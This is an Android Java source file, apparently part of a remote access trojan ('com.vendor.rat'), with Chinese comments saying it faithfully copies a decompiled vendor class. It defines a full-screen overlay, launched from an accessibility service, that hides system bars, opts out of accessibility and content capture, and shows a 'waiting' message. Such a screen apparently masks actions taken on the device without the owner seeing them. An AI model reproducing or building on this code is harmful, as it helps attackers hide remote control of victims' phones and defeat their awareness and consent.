package com.vendor.rat.helper;

import android.graphics.Color;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.TextView;

import com.vendor.rat.service.MyAccessibilityService;

import java.lang.ref.WeakReference;
import java.util.Objects;

/**
 * Vendor: e0.g (外层容器, 59行) — 一比一复刻
 *
 * 构造器参数: (MyAccessibilityService, String hint, Drawable background)
 * - 如果 drawable != null → setBackground(drawable)
 * - 否则 → setBackgroundColor(0xFF000000) 纯黑
 * - 创建内层 e0.i (tag="waiting-block-view") 并 addView
 * - WeakReference 指向内层 (用于 sendProgress 链路)
 *
 * onLayout: 遍历 children，找 tag="waiting-block-view" 的 child，layout 为全屏
 */
public final class BlockOverlayView extends LinearLayout {

    // vendor: f311a — WeakReference 指向内层 (e0.i)
    public WeakReference<View> f311a;

    /**
     * vendor: e0.g 构造器 (行 19-45)
     * 参数对齐: (service, hint, drawable)
     */
    public BlockOverlayView(MyAccessibilityService service, String hint, Drawable drawable) {
        super(service);
        boolean hasDrawable = true;

        // vendor 行 22-23
        setOrientation(VERTICAL);
        setGravity(17); // CENTER

        // vendor 行 24
        setSystemUiVisibility(4); // SYSTEM_UI_FLAG_FULLSCREEN

        // vendor 行 25
        setImportantForAccessibility(2); // IMPORTANT_FOR_ACCESSIBILITY_NO

        // vendor 行 26-28
        if (Build.VERSION.SDK_INT >= 30) {
            setImportantForContentCapture(2);
        }

        // vendor 行 29-33: 如果有 drawable 则设为背景，否则纯黑
        // ADAPT: 外层设为透明，让内层半透明黑色 + 图标/进度条/文字可见
        // vendor 外层纯黑是因为内层 onLayout 正确渲染了内容
        // 我们的内层 onLayout 自定义布局可能导致内容不可见
        // 所以外层用透明，视觉效果由内层 Color.argb(153,0,0,0) 提供
        if (drawable != null) {
            setBackground(drawable);
        } else {
            setBackgroundColor(0x00000000); // 透明
        }

        // vendor 行 37: GlobalLayoutListener (用于调整布局)
        // ADAPT: 省略 h(this) listener，不影响核心功能

        // vendor 行 38-39: 如果 hint 为空则不创建内层
        if (hint == null || hint.isEmpty()) {
            return;
        }

        // vendor 行 41-44: 创建内层 e0.i
        BlockOverlayInner inner = new BlockOverlayInner(service, hint);
        inner.setTag("waiting-block-view");
        addView(inner, 0);
        this.f311a = new WeakReference<>((View) inner);
    }

    /**
     * 便捷构造器 (无 drawable)
     */
    public BlockOverlayView(MyAccessibilityService service, String hint) {
        this(service, hint, null);
    }

    /**
     * vendor: e0.g onLayout (行 48-58)
     * 遍历 children，找 tag="waiting-block-view" 的 child，layout 为全屏
     */
    @Override
    public final void onLayout(boolean changed, int l, int t, int r, int b) {
        int childCount = getChildCount();
        if (childCount > 0) {
            for (int i = 0; i < childCount; i++) {
                View child = getChildAt(i);
                if (Objects.equals(child.getTag(), "waiting-block-view")) {
                    child.layout(l, t, r, b);
                }
            }
        }
    }
}
